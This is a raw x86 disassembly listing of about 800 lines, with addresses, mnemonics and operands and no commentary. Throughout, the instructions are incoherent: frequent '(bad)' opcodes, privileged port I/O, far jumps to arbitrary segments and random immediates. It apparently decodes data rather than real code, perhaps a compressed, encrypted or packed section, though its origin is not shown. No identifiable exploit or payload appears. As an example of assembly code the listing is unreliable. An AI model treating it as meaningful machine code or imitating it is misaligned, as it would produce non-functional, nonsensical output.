  41822e:	jmp    0x72ef957b
  418233:	and    DWORD PTR [edi+0x5b],eax
  418236:	loopne 0x418277
  418238:	adc    DWORD PTR [ebp-0x2e],edi
  41823b:	fiadd  DWORD PTR [edi]
  41823d:	into   
  41823e:	std    
  41823f:	adc    eax,0x19f824f3
  418244:	mov    bh,0xdb
  418246:	add    edi,DWORD PTR [esi-0x56160f04]
  41824c:	push   ecx
  41824d:	jno    0x418207
  41824f:	(bad)  
  418250:	out    0x21,eax
  418252:	mov    gs,WORD PTR [edi+0x15]
  418255:	out    0xf5,al
  418257:	in     al,dx
  418258:	push   esp
  418259:	jns    0x418222
  41825b:	cs lahf 
  41825d:	jnp    0x41821d
  41825f:	mov    edx,0xd0b26e44
  418264:	dec    ebp
  418265:	call   DWORD PTR [eax]
  418267:	ret    0x9126
  41826a:	push   ds
  41826b:	pop    edi
  41826c:	bound  ecx,QWORD PTR [eax-0x14fb139c]
  418272:	add    ebp,esp
  418274:	ds leave 
  418276:	sub    eax,0xf9c0ce11
  41827b:	cwde   
  41827c:	mov    bl,0xed
  41827e:	fsub   QWORD PTR [ebx+0x59]
  418281:	or     DWORD PTR [ecx+0x19f9ae4d],esi
  418287:	lods   al,BYTE PTR ds:[esi]
  418288:	mov    bh,0xcb
  41828a:	pusha  
  41828b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41828c:	ds in  eax,dx
  41828e:	mov    ebx,0x8761b96c
  418293:	pop    esi
  418294:	ins    DWORD PTR es:[edi],dx
  418295:	add    DWORD PTR [eax+0x14],edi
  418298:	push   es
  418299:	and    esi,DWORD PTR [eax-0x7c5c154d]
  41829f:	leave  
  4182a0:	ja     0x41822a
  4182a2:	pop    edx
  4182a3:	or     DWORD PTR [eax+eax*8],0x85668277
  4182aa:	loope  0x41828e
  4182ac:	mov    ah,0x17
  4182ae:	sbb    bh,BYTE PTR [ebx]
  4182b0:	jmp    esi
  4182b2:	in     eax,0x5
  4182b4:	mov    cl,0x55
  4182b6:	pop    ebp
  4182b7:	dec    ebx
  4182b8:	cmp    dh,BYTE PTR [edx-0x7b7fbf5c]
  4182be:	push   edx
  4182bf:	int3   
  4182c0:	jp     0x418320
  4182c2:	jns    0x418249
  4182c4:	cli    
  4182c5:	mov    ah,0xf0
  4182c7:	pop    ebp
  4182c8:	pop    ecx
  4182c9:	pop    eax
  4182ca:	xchg   edx,eax
  4182cb:	mov    eax,0xc2e28e36
  4182d0:	sub    al,0xbb
  4182d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182d3:	lds    edx,FWORD PTR [ecx+0x70eadf64]
  4182d9:	mov    esp,DWORD PTR [edx+0x2df1b397]
  4182df:	rcr    ah,0x8f
  4182e2:	lods   al,BYTE PTR ds:[esi]
  4182e3:	push   esp
  4182e4:	dec    esi
  4182e5:	pop    ebp
  4182e6:	mov    BYTE PTR [esi-0x5603f5bc],ah
  4182ec:	jae    0x418305
  4182ee:	push   0xffffffdc
  4182f0:	or     al,0xcd
  4182f2:	xchg   ebx,eax
  4182f3:	adc    BYTE PTR ds:0xfe6ba091,0x65
  4182fa:	(bad)  
  4182fc:	and    cl,0x1a
  4182ff:	mov    edx,0x4e5c2c09
  418304:	xor    DWORD PTR [esi+ebx*8+0x5],ebx
  418308:	add    BYTE PTR [ebp-0x23],0x9b
  41830c:	out    dx,eax
  41830d:	test   BYTE PTR [ecx+eiz*1-0x79731269],dl
  418314:	loope  0x418371
  418316:	cmp    esp,0x3a50e642
  41831c:	cmp    ecx,DWORD PTR [ecx]
  41831e:	and    al,0x72
  418320:	fistp  WORD PTR [edx+0x38f7654b]
  418326:	and    BYTE PTR [ecx+ebx*1+0x117b26f8],ch
  41832d:	out    dx,eax
  41832e:	mov    esp,0x23ba0e8a
  418333:	xchg   esi,eax
  418334:	mov    fs,WORD PTR ss:[ebx]
  418337:	sub    eax,0x4b87cc1c
  41833c:	test   BYTE PTR [ebx+0x40ac5621],cl
  418342:	(bad)  
  418343:	out    dx,al
  418344:	jb     0x418353
  418346:	and    ebp,ecx
  418348:	inc    ecx
  418349:	mov    bl,0xe9
  41834b:	(bad)
  41834f:	sbb    eax,DWORD PTR [esi]
  418351:	in     al,0xd
  418353:	and    al,0xb3
  418355:	sti    
  418356:	and    al,0xf0
  418358:	repz retf 0x995
  41835c:	sbb    BYTE PTR [edi+0x1],cl
  41835f:	jmp    0xa7e1bb5d
  418364:	mov    cl,0xdc
  418366:	aas    
  418367:	and    al,0x32
  418369:	push   cs
  41836a:	(bad)  
  41836b:	retf   
  41836c:	add    DWORD PTR [edi],eax
  41836e:	push   ecx
  41836f:	mov    edi,0x53ef883f
  418374:	xor    BYTE PTR [ebx-0x61cf280e],ch
  41837a:	out    0x3a,al
  41837c:	jge    0x41832d
  41837e:	inc    edx
  41837f:	inc    esp
  418380:	adc    dl,BYTE PTR [ecx+0xc]
  418383:	test   BYTE PTR [esi+0x3a],al
  418386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418387:	test   ebx,ebp
  418389:	or     edi,DWORD PTR [ebp+0x33618cc3]
  41838f:	jnp    0x418365
  418391:	dec    eax
  418392:	not    BYTE PTR [edi+0x23a976b4]
  418398:	fsub   DWORD PTR [ebx+0x3]
  41839b:	in     eax,dx
  41839c:	xor    eax,0x6299a45d
  4183a1:	sub    DWORD PTR [ecx],0xffffffcf
  4183a4:	ret    
  4183a5:	fsub   QWORD PTR [ebp+0x68]
  4183a8:	mov    eax,ds:0x30994139
  4183ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183ae:	cmp    dl,BYTE PTR [esi]
  4183b0:	or     cl,BYTE PTR [edx]
  4183b2:	lock scas eax,DWORD PTR es:[edi]
  4183b4:	lock or BYTE PTR [eax+0x1a008785],bl
  4183bb:	xor    eax,0xb2ab436c
  4183c0:	jb     0x4183db
  4183c2:	jmp    0xabf1d9e
  4183c7:	je     0x4183e8
  4183c9:	or     BYTE PTR [edx+0x5],ah
  4183cc:	dec    esi
  4183cd:	mov    WORD PTR [ecx+0x1e],fs
  4183d0:	(bad)  
  4183d1:	cmp    BYTE PTR [edx+0x4f6d05c],ch
  4183d7:	fsub   DWORD PTR [ebx+edi*1-0x4e]
  4183db:	sub    DWORD PTR [edi-0x4e4bd706],edi
  4183e1:	cmovo  ebp,DWORD PTR [ebp+ebx*4+0x31]
  4183e6:	mov    WORD PTR [ebx],?
  4183e8:	xor    ecx,edx
  4183ea:	jl     0x41845c
  4183ec:	or     DWORD PTR [ebx+0xc],0x139139e9
  4183f3:	pop    eax
  4183f4:	xchg   edi,eax
  4183f5:	mov    ds,WORD PTR [eax-0x1c0ca3c7]
  4183fb:	inc    eax
  4183fc:	or     ebp,edi
  4183fe:	add    al,0x83
  418400:	repnz mov ebp,DWORD PTR [edi]
  418403:	xor    DWORD PTR [eax+ebx*8+0x2cff71d2],esp
  41840a:	pushf  
  41840b:	shl    DWORD PTR [esi+0x450990a0],0x8
  418412:	and    al,0xa8
  418414:	inc    ecx
  418415:	sub    BYTE PTR [eax],cl
  418417:	imul   ebx,DWORD PTR [edi-0x7030ed76],0x74
  41841e:	fs jne 0x860da667
  418425:	pop    ebp
  418426:	imul   edi,ebp,0xffffff81
  418429:	xchg   ebp,eax
  41842a:	in     eax,dx
  41842b:	jl     0x41844f
  41842d:	cli    
  41842e:	ins    BYTE PTR es:[edi],dx
  41842f:	push   cs
  418430:	pop    esi
  418431:	sahf   
  418432:	(bad)
  418436:	icebp  
  418437:	in     eax,0x99
  418439:	xlat   BYTE PTR ds:[ebx]
  41843a:	(bad)  
  41843b:	mov    al,ds:0x6984dfc9
  418440:	out    dx,eax
  418441:	push   esi
  418442:	outs   dx,DWORD PTR ds:[esi]
  418443:	(bad)  
  418444:	lahf   
  418445:	mov    bl,0xb5
  418447:	mov    esp,0x5009266
  41844c:	mov    edx,ecx
  41844e:	rol    ebx,cl
  418450:	aam    0x83
  418452:	mov    edi,0xaa5d8d9e
  418457:	mov    al,ds:0xd748b8a
  41845c:	lea    esi,[edi-0x281ba43b]
  418462:	cmp    dh,BYTE PTR [ebp-0x7f]
  418465:	adc    DWORD PTR ds:0xd3e9c17,edx
  41846b:	add    eax,0x4fa14c38
  418470:	pop    esi
  418471:	or     DWORD PTR ds:0x61149307,ebp
  418477:	xor    BYTE PTR [ebp-0x51],bh
  41847a:	test   eax,0xcca051b0
  41847f:	mov    al,ds:0x3f31b42d
  418484:	push   cs
  418485:	sub    eax,0xe3af97f9
  41848a:	and    DWORD PTR [ecx-0x75],esi
  41848d:	nop
  41848e:	sbb    eax,0x3882a7f0
  418493:	test   DWORD PTR ds:[ebp-0x14b5cdc7],esi
  41849a:	sub    cl,0xc6
  41849d:	sub    DWORD PTR [ecx+0x7873a614],ecx
  4184a3:	adc    BYTE PTR [ebx+0x1a0a224c],ah
  4184a9:	xchg   esi,eax
  4184aa:	xor    eax,0xccd1c7a2
  4184af:	sub    al,0xa2
  4184b1:	neg    DWORD PTR [edx+0x16]
  4184b4:	(bad)  
  4184b5:	imul   ebp,DWORD PTR ss:[ebx],0xffffff97
  4184b9:	add    dh,ch
  4184bb:	adc    bh,BYTE PTR [edi]
  4184bd:	jmp    0xeff7c4de
  4184c2:	xor    DWORD PTR [eax],edi
  4184c4:	push   es
  4184c5:	int3   
  4184c6:	aam    0x80
  4184c8:	and    DWORD PTR [ebx],ecx
  4184ca:	or     DWORD PTR [edx-0x5880d000],ebp
  4184d0:	xlat   BYTE PTR ds:[ebx]
  4184d1:	sub    al,0x5e
  4184d3:	fsubr  DWORD PTR [edx]
  4184d5:	inc    esp
  4184d6:	mov    es,WORD PTR [eax+0x5b2ac98f]
  4184dc:	dec    ecx
  4184dd:	mov    bl,0xa5
  4184df:	add    eax,0x56c44c
  4184e4:	push   eax
  4184e5:	ds pushf 
  4184e7:	jmp    FWORD PTR [ebx+ebx*8+0x32]
  4184eb:	sub    al,0x95
  4184ed:	cdq    
  4184ee:	push   eax
  4184ef:	scas   al,BYTE PTR es:[edi]
  4184f0:	sub    DWORD PTR [edx],esp
  4184f2:	dec    edx
  4184f3:	les    edi,FWORD PTR [ebp+edi*1+0x7f]
  4184f7:	sub    DWORD PTR [ebp+0x5f],ebp
  4184fa:	fxch   st(1)
  4184fc:	icebp  
  4184fd:	scas   al,BYTE PTR es:[edi]
  4184fe:	mov    al,ds:0x93ec87c9
  418503:	push   edx
  418504:	(bad)  
  418505:	adc    ebp,DWORD PTR [eax-0x58]
  418508:	pop    ebp
  418509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850a:	inc    DWORD PTR [ebp+0x1ffc9833]
  418510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418511:	out    dx,al
  418512:	test   BYTE PTR [eax+0xc6d7990],al
  418518:	sub    eax,0xa2c436b4
  41851d:	pop    ebp
  41851e:	aas    
  41851f:	test   BYTE PTR [ebx+0x2146c8d3],dl
  418525:	fwait
  418526:	out    0x89,eax
  418528:	fdivr  st(4),st
  41852a:	lds    esp,FWORD PTR [edx]
  41852c:	sub    al,0xe6
  41852e:	inc    esp
  41852f:	mov    ds:0x18ff561f,al
  418534:	hlt    
  418535:	clc    
  418536:	adc    eax,0xf545ce36
  41853b:	xchg   cl,dh
  41853d:	ja     0x4184f0
  41853f:	jmp    0x418596
  418541:	test   al,0x4b
  418543:	inc    esi
  418544:	gs ja  0x41851c
  418547:	dec    eax
  418548:	rcr    BYTE PTR [edi-0x59],0xe6
  41854c:	stos   DWORD PTR es:[edi],eax
  41854d:	push   ss
  41854e:	sub    ah,0xf5
  418551:	mov    al,0xe7
  418553:	cs out 0x85,al
  418556:	and    al,0xab
  418558:	mov    WORD PTR [edx],es
  41855a:	dec    ecx
  41855b:	fld    QWORD PTR [edx+0x15]
  41855e:	les    ebx,FWORD PTR [edi+ecx*1-0x2f]
  418562:	dec    esp
  418563:	lea    ebx,[ebp-0x77]
  418566:	(bad)
  41856a:	dec    esi
  41856b:	xchg   ebp,eax
  41856c:	mov    DWORD PTR ds:0x54ab9684,eax
  418572:	js     0x4185da
  418574:	ja     0x418571
  418576:	ins    DWORD PTR es:[edi],dx
  418577:	out    dx,eax
  418578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418579:	lock mov DWORD PTR [esi-0x6f],esp
  41857d:	lods   eax,DWORD PTR ds:[esi]
  41857e:	imul   esp,ebx,0xbdf4a6d8
  418584:	leave  
  418585:	(bad)  
  418586:	mov    esp,0x9eafb550
  41858b:	fmul   st(5),st
  41858d:	iret   
  41858e:	ss and eax,esp
  418591:	dec    edx
  418592:	out    dx,al
  418593:	add    al,al
  418595:	in     eax,0x88
  418597:	test   DWORD PTR [ecx],ebx
  418599:	sbb    BYTE PTR [eax],ch
  41859b:	pop    ebp
  41859c:	in     al,dx
  41859d:	dec    esp
  41859e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41859f:	mov    ebx,0x48b9932
  4185a4:	jmp    0xa6a32758
  4185a9:	jno    0x418565
  4185ab:	push   es
  4185ac:	cmp    DWORD PTR [esi],eax
  4185ae:	dec    ebx
  4185af:	push   eax
  4185b0:	xor    edx,0x6
  4185b3:	loope  0x4185f4
  4185b5:	jp     0x4185e9
  4185b7:	out    0xec,eax
  4185b9:	xor    BYTE PTR [esp+edi*1-0x5d],ah
  4185bd:	repnz data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c0:	dec    esi
  4185c1:	push   es
  4185c2:	mov    cl,0x67
  4185c4:	clc    
  4185c5:	xor    dl,al
  4185c7:	lods   eax,DWORD PTR ds:[esi]
  4185c8:	aad    0x8
  4185ca:	pusha  
  4185cb:	sub    esi,DWORD PTR [esp+ebx*8+0x21]
  4185cf:	xor    bl,BYTE PTR [edi+0x362e51e6]
  4185d5:	stc    
  4185d6:	stos   DWORD PTR es:[edi],eax
  4185d7:	scas   eax,DWORD PTR es:[edi]
  4185d8:	(bad)  
  4185d9:	jo     0x4185ee
  4185db:	push   ecx
  4185dc:	lods   eax,DWORD PTR ds:[esi]
  4185dd:	pop    es
  4185de:	(bad)  [edx]
  4185e0:	stos   DWORD PTR es:[edi],eax
  4185e1:	adc    al,0x51
  4185e3:	mov    ebp,0x3b85d57d
  4185e8:	mov    esi,0x4bec331
  4185ed:	sbb    dl,cl
  4185ef:	cld    
  4185f0:	cdq    
  4185f1:	icebp  
  4185f2:	mov    bh,0x99
  4185f4:	rol    BYTE PTR [ecx],0xc6
  4185f7:	call   0xc468c31d
  4185fc:	lock dec esp
  4185fe:	sub    DWORD PTR [edx-0x16],edx
  418601:	rol    BYTE PTR [ebx],1
  418603:	prefetch BYTE PTR [ecx-0x61]
  418607:	aam    0xa8
  418609:	push   esi
  41860a:	or     bl,BYTE PTR [edi+0x13]
  41860d:	xchg   ebx,eax
  41860e:	sub    eax,ecx
  418610:	sti    
  418611:	mov    BYTE PTR [ebx],al
  418613:	inc    edx
  418614:	mov    cl,0x77
  418616:	sbb    esp,DWORD PTR [ebx]
  418618:	jg     0x4185c6
  41861a:	sub    eax,0xb22cd7ef
  41861f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418620:	in     eax,dx
  418621:	push   edx
  418622:	push   ecx
  418623:	in     al,0x59
  418625:	or     esi,eax
  418627:	ret    
  418628:	mov    WORD PTR [ecx+eiz*4+0x35],cs
  41862c:	push   ds
  41862d:	ins    BYTE PTR es:[edi],dx
  41862e:	push   ebp
  41862f:	mov    ds:0xeff4fdcf,eax
  418634:	xchg   BYTE PTR [esi+0x3ad1c9e1],bh
  41863a:	stc    
  41863b:	imul   esi,DWORD PTR [edi],0x3ec5cf23
  418641:	xchg   ecx,eax
  418642:	mov    ch,0x38
  418644:	inc    ebp
  418645:	mov    cs,WORD PTR [ebp+eiz*4-0x1e]
  418649:	adc    bh,BYTE PTR [edi+esi*1+0x1a3e2cff]
  418650:	fsubr  st(3),st
  418652:	or     eax,DWORD PTR [ecx-0x29014a0c]
  418658:	mov    ebx,0xb8061f41
  41865d:	cmp    bh,BYTE PTR [ecx+0x5ee7d8da]
  418663:	adc    cl,BYTE PTR [edi]
  418665:	and    ebp,0x71
  418668:	sub    eax,0xac683ef8
  41866d:	xlat   BYTE PTR fs:[ebx]
  41866f:	fwait
  418670:	inc    ecx
  418671:	std    
  418672:	data16 std 
  418674:	mov    al,0x1f
  418676:	es (bad) 
  418679:	outs   dx,DWORD PTR ds:[esi]
  41867a:	mov    ds:0xe49135ce,eax
  41867f:	adc    bl,BYTE PTR [eax+0x5be3727]
  418685:	shr    BYTE PTR [eax+edi*1-0x6e],cl
  418689:	popf   
  41868a:	push   ss
  41868b:	inc    ebp
  41868c:	ja     0x41862a
  41868e:	push   ebp
  41868f:	js     0x41868e
  418691:	jecxz  0x4186a0
  418693:	cli    
  418694:	sahf   
  418695:	mov    edi,0xdba79adc
  41869a:	scas   al,BYTE PTR es:[edi]
  41869b:	pop    ecx
  41869c:	sar    DWORD PTR [ecx-0x10],0xa2
  4186a0:	test   DWORD PTR [edx+0x37],eax
  4186a3:	test   eax,0x8364f25c
  4186a8:	lea    ecx,[edi]
  4186aa:	cld    
  4186ab:	xchg   ebx,esi
  4186ad:	pop    esp
  4186ae:	jmp    0x67c2:0xa859a717
  4186b5:	stc    
  4186b6:	mov    edi,0x1467ee92
  4186bb:	gs inc eax
  4186bd:	int3   
  4186be:	call   0xaf28:0xcdaa04a
  4186c5:	arpl   si,sp
  4186c7:	push   edx
  4186c8:	add    DWORD PTR [edi+0x45],edx
  4186cb:	stos   BYTE PTR es:[edi],al
  4186cc:	jbe    0x41866e
  4186ce:	aas    
  4186cf:	cs pop edi
  4186d1:	mov    bh,0x3b
  4186d3:	popa   
  4186d4:	les    ebp,FWORD PTR [ebx-0x242fb7fa]
  4186da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186db:	add    bl,BYTE PTR [esi-0x5dd1ac1e]
  4186e1:	jl     0x418678
  4186e3:	xchg   esp,eax
  4186e4:	imul   ebp,DWORD PTR [ecx-0x6e],0xffffff89
  4186e8:	repz lahf 
  4186ea:	cmp    eax,0x96edc59
  4186ef:	fisub  DWORD PTR [edx+eax*8]
  4186f2:	pop    ds
  4186f3:	ret    0xe8ff
  4186f6:	loop   0x41874b
  4186f8:	push   edx
  4186f9:	es aaa 
  4186fb:	cmp    bl,BYTE PTR [ecx+0x63]
  4186fe:	mov    esp,0xe250d46c
  418703:	xchg   ebp,eax
  418704:	pop    ebp
  418705:	out    dx,al
  418706:	push   esp
  418707:	ds dec esi
  418709:	ret    
  41870a:	inc    ebp
  41870b:	stos   DWORD PTR es:[edi],eax
  41870c:	mov    eax,ds:0x5a3b966f
  418711:	nop
  418712:	push   ebp
  418713:	inc    esi
  418714:	mov    edx,0x55b404a2
  418719:	aaa    
  41871a:	push   eax
  41871b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41871c:	ja     0x4186fe
  41871e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41871f:	test   eax,0x65e70d11
  418724:	or     edx,DWORD PTR [edi+0x57f0d824]
  41872a:	mov    ah,0xdc
  41872c:	sub    esi,eax
  41872e:	mov    bh,0xc9
  418730:	fld    TBYTE PTR [eax+ebp*4]
  418733:	imul   eax
  418735:	adc    ch,BYTE PTR [ebp-0x663807ac]
  41873b:	fcomp  DWORD PTR [edx+edx*4]
  41873e:	mov    ah,0xb7
  418740:	mov    esi,0x2f40ae98
  418745:	ror    BYTE PTR [edx-0x78],cl
  418748:	ret    
  418749:	cmp    esp,DWORD PTR [edx+0x74]
  41874c:	push   0x52
  41874e:	mov    bh,0x71
  418750:	push   esi
  418751:	pushw  0x8abd
  418755:	jge    0x4187c8
  418757:	pop    eax
  418758:	scas   eax,DWORD PTR es:[edi]
  418759:	jbe    0x4187bd
  41875b:	adc    dh,ah
  41875d:	ret    
  41875e:	jmp    0x4e57:0xf70d6c0c
  418765:	pushf  
  418766:	mov    ecx,0xd9312d48
  41876b:	or     BYTE PTR [ebx+0x40c89803],al
  418771:	and    esp,DWORD PTR [esi]
  418773:	out    0xeb,eax
  418775:	sub    DWORD PTR [ebp-0x70],esp
  418778:	pop    ss
  418779:	cmp    edi,DWORD PTR [eax+0x23590e20]
  41877f:	arpl   WORD PTR [ecx],ax
  418781:	jb     0x41870f
  418783:	mov    BYTE PTR [eax],cl
  418785:	and    al,0xee
  418787:	or     BYTE PTR [ebx-0x7ef333a3],ch
  41878d:	pop    eax
  41878e:	scas   al,BYTE PTR es:[edi]
  41878f:	push   edx
  418790:	sub    DWORD PTR [edx],ebx
  418792:	inc    esp
  418793:	rcl    BYTE PTR [esi-0x15],0x82
  418797:	test   DWORD PTR [ebx+ebp*2+0x68b95c26],esp
  41879e:	jo     0x4187c3
  4187a0:	cdq    
  4187a1:	bound  eax,QWORD PTR [ecx]
  4187a3:	add    al,0x45
  4187a5:	cmp    eax,0x4825b640
  4187aa:	addr16 aad 0x13
  4187ad:	push   edx
  4187ae:	dec    eax
  4187af:	lods   al,BYTE PTR ds:[esi]
  4187b0:	loop   0x4187ef
  4187b2:	ret    
  4187b3:	fldenv [ebp+0x2d]
  4187b6:	out    0xf7,eax
  4187b8:	and    eax,0x1003b8fa
  4187bd:	int3   
  4187be:	inc    ecx
  4187bf:	fisttp WORD PTR [ecx+0x49]
  4187c2:	pop    ecx
  4187c4:	outs   dx,DWORD PTR ds:[esi]
  4187c5:	push   ecx
  4187c6:	xor    ah,bh
  4187c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187c9:	pop    ds
  4187ca:	xor    BYTE PTR [eax+0x65],ch
  4187cd:	call   0xd8d73d74
  4187d2:	stos   BYTE PTR es:[edi],al
  4187d3:	fstp   TBYTE PTR [esi]
  4187d5:	fld    st(7)
  4187d7:	sbb    esi,esi
  4187d9:	mov    dl,0xb9
  4187db:	rcl    BYTE PTR [ecx],cl
  4187dd:	dec    ebp
  4187de:	add    bh,bl
  4187e0:	pushf  
  4187e1:	sub    DWORD PTR [eax],esi
  4187e3:	jge    0x4187e3
  4187e5:	ss jl  0x4187a7
  4187e8:	mov    eax,0x94c6bfc1
  4187ed:	push   DWORD PTR [ebx-0x1f]
  4187f0:	scas   eax,DWORD PTR es:[edi]
  4187f1:	js     0x4187e9
  4187f3:	push   esp
  4187f4:	and    DWORD PTR [edx+eax*8+0x39f22629],edi
  4187fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187fc:	cli    
  4187fd:	xchg   bh,dh
  4187ff:	push   esp
  418800:	jo     0x418797
  418802:	pop    ds
  418803:	sbb    edi,DWORD PTR [ecx]
  418805:	repnz fwait
  418807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418808:	inc    DWORD PTR [edi]
  41880a:	push   eax
  41880b:	adc    eax,0x9788f47c
  418810:	div    esi
  418812:	test   DWORD PTR [esp+edi*4-0x46a4bb62],edx
  418819:	inc    ecx
  41881a:	xor    eax,0x45622073
  41881f:	outs   dx,DWORD PTR ds:[esi]
  418820:	pushf  
  418821:	adc    cl,BYTE PTR [edx]
  418823:	sub    cl,BYTE PTR [ebx-0x4d309eee]
  418829:	mov    ds:0x79a8f969,al
  41882e:	and    al,0x5a
  418830:	dec    DWORD PTR [eax-0x1232723a]
  418836:	jmp    0x41883c
  418838:	and    edx,DWORD PTR [esi+ebp*8+0x64]
  41883c:	xor    dh,cl
  41883e:	or     cl,dh
  418840:	jge    0x418865
  418842:	jbe    0x418820
  418844:	and    al,0x99
  418846:	stos   DWORD PTR es:[edi],eax
  418847:	(bad)
  41884b:	dec    ebx
  41884c:	leave  
  41884d:	mov    ebx,DWORD PTR [ebp-0x32]
  418850:	push   0xbde91f36
  418855:	or     ebp,DWORD PTR [esp+ebp*2+0x70cdb6c3]
  41885c:	push   edi
  41885d:	mov    dl,0x8f
  41885f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418860:	scas   eax,DWORD PTR es:[edi]
  418861:	iret   
  418862:	sub    eax,0xc85df115
  418867:	or     BYTE PTR [ebp+0x71162a04],bh
  41886d:	sub    BYTE PTR [ebp-0x37],bh
  418870:	es adc eax,0xce08adb5
  418876:	mov    dl,BYTE PTR [eax-0x7fa4423c]
  41887c:	fisubr DWORD PTR [ebx+0x3]
  41887f:	lock or dl,BYTE PTR [ebp-0xc]
  418883:	lahf   
  418884:	or     DWORD PTR [ecx-0x2f],0xffffffa4
  418888:	clc    
  418889:	arpl   cx,ax
  41888b:	or     dl,bl
  41888d:	test   BYTE PTR [edi-0x4b],ch
  418890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418892:	mov    ds:0x8ae7002c,eax
  418897:	mov    eax,0x6446c2f5
  41889c:	repz pop edi
  41889e:	mov    edi,0xaf3c3102
  4188a3:	aad    0xce
  4188a5:	js     0x418899
  4188a7:	xchg   edx,eax
  4188a8:	xor    eax,0x351d2619
  4188ad:	adc    BYTE PTR [ebp+0x40f36c30],bh
  4188b3:	cmp    ebp,DWORD PTR [esi+eiz*4+0x1d4460df]
  4188ba:	fucom  st(0)
  4188bc:	push   ecx
  4188bd:	leave  
  4188be:	in     al,0x18
  4188c0:	dec    esi
  4188c1:	shl    bl,1
  4188c3:	int3   
  4188c4:	ins    BYTE PTR es:[edi],dx
  4188c5:	ss call 0x8555:0xf09db4a
  4188cd:	shl    DWORD PTR [esi-0x36],1
  4188d0:	xchg   BYTE PTR [esi+0x98383cf],dl
  4188d6:	mov    eax,ds:0xd0c4a5c4
  4188db:	xchg   esp,eax
  4188dc:	sti    
  4188dd:	push   esp
  4188de:	hlt    
  4188df:	push   ecx
  4188e0:	xor    eax,0x2c6e74d2
  4188e5:	push   edx
  4188e6:	jae    0x4188a4
  4188e8:	inc    edx
  4188e9:	push   0x1c
  4188eb:	fisub  WORD PTR [edi+0x322e7a57]
  4188f1:	push   ebp
  4188f2:	sub    ecx,esp
  4188f4:	sbb    ah,BYTE PTR [ecx-0x2a]
  4188f7:	mov    fs,WORD PTR [ebx]
  4188f9:	scas   al,BYTE PTR es:[edi]
  4188fa:	fldcw  WORD PTR [ebx+0x3836bdc9]
  418900:	cmp    al,0x31
  418902:	jo     0x418942
  418904:	lahf   
  418905:	xor    BYTE PTR [eax+0x125ec1a9],dl
  41890b:	inc    edx
  41890c:	(bad)  
  41890d:	push   cs
  41890e:	mov    edx,0xae9b15ea
  418913:	xlat   BYTE PTR ds:[ebx]
  418914:	out    dx,al
  418915:	and    ebx,DWORD PTR [esi-0x36]
  418918:	fmul   st(1),st
  41891a:	mov    edx,cs
  41891c:	ret    0x29e
  41891f:	sbb    ecx,DWORD PTR [edx]
  418921:	outs   dx,DWORD PTR ds:[esi]
  418922:	pop    ebx
  418923:	inc    eax
  418924:	adc    eax,0x3ca4e5dd
  418929:	push   eax
  41892a:	pop    es
  41892b:	in     al,dx
  41892c:	or     esi,edi
  41892e:	pop    esp
  41892f:	sbb    al,0xdb
  418931:	arpl   WORD PTR [esi+0x2d],dx
  418934:	xor    al,0xdb
  418936:	jbe    0x41894b
  418938:	or     DWORD PTR [edx+0x7d195edf],ecx
  41893e:	cmp    BYTE PTR [eax+edi*2],0xbf
  418942:	mov    eax,0x24f4bbf7
  418947:	test   ecx,esi
  418949:	xor    DWORD PTR [edx+0x75],0xffffffba
  41894d:	mov    ch,0xa6
  41894f:	rcr    esp,0xe6
  418952:	mov    ah,0x4b
  418954:	fbstp  TBYTE PTR [edx+0x588acf7c]
  41895a:	jle    0x4189b2
  41895c:	fs daa 
  41895e:	xor    BYTE PTR [ecx+0x57a4193b],bl
  418964:	mov    WORD PTR [ecx-0x70fd70ae],fs
  41896a:	adc    ebx,ebp
  41896c:	cli    
  41896d:	push   DWORD PTR [edx]
  41896f:	test   BYTE PTR [ecx],ah
  418971:	pop    ss
  418972:	mov    edx,0xc5dcba60
  418977:	xchg   esi,eax
  418978:	mov    eax,0xba9d7f05
  41897d:	mov    al,ds:0x4efe2495
  418982:	xchg   ecx,eax
  418983:	fiadd  WORD PTR [ebx-0x42c271e]
  418989:	adc    ch,BYTE PTR [esi+0x3d3e9536]
  41898f:	mov    al,ds:0x1a16a8a1
  418994:	jo     0x4189b8
  418996:	dec    ebx
  418997:	xchg   ecx,eax
  418998:	xchg   edx,eax
  418999:	inc    edi
  41899a:	push   esp
  41899b:	ja     0x418a0a
  41899d:	add    al,0x27
  41899f:	push   es
  4189a0:	adc    ecx,DWORD PTR [esi]
  4189a2:	ins    BYTE PTR es:[edi],dx
  4189a3:	push   ds
  4189a4:	shl    BYTE PTR [edx+0x8],cl
  4189a7:	sub    ebp,DWORD PTR [ebx+0x19]
  4189aa:	cdq    
  4189ab:	xchg   edx,eax
  4189ac:	and    eax,0x1d3f0dfc
  4189b1:	push   esp
  4189b2:	out    0x4b,al
  4189b4:	mov    ah,BYTE PTR ds:[ecx-0x53]
  4189b8:	and    esp,ebp
  4189ba:	pop    eax
  4189bb:	sbb    BYTE PTR [ebx-0xb9cfc44],bl
  4189c1:	or     edx,ebp
  4189c3:	xchg   esi,eax
  4189c4:	push   0xffffffb7
  4189c6:	jp     0x4189f1
  4189c8:	dec    BYTE PTR [ecx+esi*8+0x23b18554]
  4189cf:	sub    al,0x56
  4189d1:	in     al,0x29
  4189d3:	xchg   ebx,eax
  4189d4:	jns    0x418a46
  4189d6:	shr    BYTE PTR [edx+edi*4-0x25],cl
  4189da:	mov    esp,0xb7a8f4ba
  4189df:	setbe  bl
  4189e2:	inc    esp
  4189e3:	jmp    0x4189a5
  4189e5:	mov    BYTE PTR [eax+0x7071813c],dl
  4189eb:	mov    dh,0x1e
